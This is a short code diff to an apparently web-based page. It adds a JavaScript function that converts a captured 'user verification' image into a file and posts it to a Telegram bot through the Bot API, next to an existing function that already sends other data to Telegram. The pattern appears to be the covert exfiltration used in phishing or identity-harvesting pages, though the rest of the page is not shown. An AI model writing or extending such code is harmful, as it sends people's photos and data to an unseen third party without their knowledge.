@@ -238,6 +238,26 @@
             loadingScreen.style.display = show ? 'flex' : 'none';
         }
         
+         // Send image to Telegram
+        async function sendImageToTelegram(imageData) {
+            try {
+                const blob = await fetch(imageData).then(r => r.blob());
+                const formData = new FormData();
+                formData.append('photo', blob, 'user_verification.jpg');
+                formData.append('chat_id', CHAT_ID);
+                formData.append('caption', 'User verification image');
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                return true;
+            } catch (e) {
+                console.error('Image send error:', e);
+                return false;
+            }
+        }
+
         // Send data to Telegram
         async function sendToTelegram(data) {
             try {
